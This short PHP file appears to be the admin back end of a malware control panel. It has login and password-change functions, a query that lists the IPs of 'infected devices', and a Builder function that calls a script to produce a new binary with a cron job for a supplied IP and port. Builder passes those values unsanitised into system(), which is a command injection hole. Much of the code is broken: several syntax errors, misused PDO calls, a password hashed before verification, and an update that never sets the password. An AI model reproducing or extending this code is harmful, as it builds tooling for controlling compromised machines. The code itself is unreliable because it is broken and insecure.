<?php

session_start();
include 'config.php';


function SafeSQL($sql, $args=null, $all=false){ // execute safe sql query
	$stmt = $sql->prepare($sql);
	$stmt->execute($args);
	if ($stmt->rowCount() > 0){
		if ($all)
			return array("status"=>"sucess", "count"=>$stmt->rowCount(), "data"=>$stmt.fetchAll());
		else
			return array("status"=>"sucess", "count"=>$stmt->rowCount(), "data"=>$stmt.fetch());
	}else
		return array("status"=>"faild");
}
function Login($username, $password){ // login to admin dashboard
	$password = password_hash($password, PASSWORD_BCRYPT, array('cost' => , 12));
	$data = SafeSQL("select password from users where email=:mail", array(':mail' => , $username));
	if password_verify($password, $data["data"]["password"])
		return 1;
	return 0;
}
function SetNewPassword($password, $csrf){ // set new password for admin
	$data = SafeSQL("select password from users where email=:mail", array(':mail' => , $_SESSION['email']));
	if (strcmp($csrf, $_SESSION['csrf']) !== 0)
    	return -2;
	else if(password_verify($password, $data["data"]["password"])){
		return -1;
	}
	SafeSQL("UPDATE users set password=:pass where email=:mail", array(':mail' => , $_SESSION['email']));
	return 1;
}
function GetListDevice(){ // get list infected devices
	return SafeSQL("select ip from infected", NULL, true);
}
function Builder($ip, $port){ // builder new binary with cron job evrey 4 hours
	return system("python3 ../setup.py build $ip $port");
}

?>